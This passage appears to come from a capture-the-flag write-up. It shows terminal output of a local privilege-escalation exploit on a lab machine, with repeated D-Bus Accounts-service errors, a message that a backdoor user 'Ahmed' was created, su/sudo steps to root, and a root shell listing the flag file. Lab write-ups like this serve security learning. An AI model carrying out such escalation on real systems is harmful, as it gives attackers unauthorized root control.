Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
Error org.freedesktop.DBus.Error.UnknownMethod: No such interface 'org.freedesktop.Accounts.User' on object at path /org/freedesktop/Accounts/User1005
[+] Timed out at: 0.00896006339346211
[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

bash: cannot set terminal process group (83358): Inappropriate ioctl for device
bash: no job control in this shell
[root@paper dwight]# id
uid=0(root) gid=0(root) groups=0(root)
[root@paper dwight]# ls -la /root/root.txt
-r--------. 1 root root 33 Feb 24 09:08 /root/root.txt
```
